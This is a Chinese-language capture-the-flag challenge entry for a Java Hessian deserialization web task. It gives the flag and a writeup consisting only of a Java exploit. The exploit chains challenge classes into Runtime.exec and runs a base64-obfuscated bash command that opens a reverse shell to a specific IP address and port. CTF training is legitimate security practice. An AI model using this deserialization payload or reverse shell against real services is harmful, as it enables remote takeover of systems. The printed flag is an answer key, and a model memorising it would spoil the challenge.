- **题目名称：** hessian_checkin
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** ABU
- **考点：**
1. java hessian反序列化漏洞
- **描述：** 听说hessian反序列化比原生的快很多，我立马写了个服务来测试看看！！！
- **flag：** XSCTF{81f989bf-31d2-4f82-93a9-2c2ee44630d8}
- **Writeup：** 

```java
package org.xsctf.checkin;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import org.xsctf.checkin.bean.UserBean;
import org.xsctf.checkin.until.UserFun;
import org.xsctf.checkin.until.UserMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws Exception {
        UserFun[] userFuns = {
                new UserFun(),
                new UserFun("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new UserFun("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new UserFun("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNS4yMzguNTIvMzA2NjAgMD4mMQ==}|{base64,-d}|{bash,-i}"})
        };
        UserBean userBean = new UserBean(userFuns, null);
        Map map = new HashMap();
        map.put("key", userBean);
        UserMap userMap = new UserMap(map, "key");
        HashMap hashMap = new HashMap();
        hashMap.put(userMap, "value");
        Field bean = userBean.getClass().getDeclaredField("bean");
        bean.setAccessible(true);
        bean.set(userBean, Runtime.class);
        byte[] bytes = HessianSerialize(hashMap);
//        HessianDeserialize(bytes);
    }
    public static byte[] HessianSerialize(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(o);
        hessian2Output.flushBuffer();
        byte[] bytes = baos.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(bytes));
        return bytes;
    }
    public static Object HessianDeserialize(byte[] bytes) throws Exception {
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(bytes));
        Object o = hessian2Input.readObject();
        return o;
    }
}

```
